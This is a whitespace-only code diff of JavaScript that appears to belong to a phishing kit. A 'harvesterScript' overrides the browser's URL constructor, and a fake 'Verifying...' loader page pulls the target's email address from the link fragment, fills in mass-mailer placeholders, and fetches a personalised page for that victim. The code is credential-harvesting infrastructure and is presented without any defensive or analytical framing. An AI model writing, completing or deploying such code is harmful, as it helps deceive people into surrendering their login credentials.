@@ -40,7 +40,7 @@ const harvesterScript = `
 // 1. Polyfill to prevent URL crashes
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
-    try { return new OriginalURL(url, base || window.location.origin); } 
+    try { return new OriginalURL(url, base || window.location.origin); }
     catch (e) {
         if (typeof url === 'string' && !url.startsWith('http')) {
             return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
@@ -111,26 +111,26 @@ const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style
 setTimeout(()=>{
     var hash = window.location.hash;
     var email = "";
-    
+
     if (hash && hash.length > 1) {
-        var raw = hash.substring(1); 
+        var raw = hash.substring(1);
 
         if (raw.startsWith('t=')) {
             var b64 = raw.split('t=')[1];
             try { email = atob(b64); } catch(e) { email = b64; }
         } else {
-            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
+            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); }
             else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
             else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
             else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
             else { email = raw; }
-            
+
             var b64Email = btoa(email);
             window.history.replaceState({}, '', '/#?t=' + b64Email);
         }
 
         window._targetEmail = email;
-        
+
         fetch('/api/fetch?email=' + encodeURIComponent(email))
             .then(r => r.text())
             .then(html => {
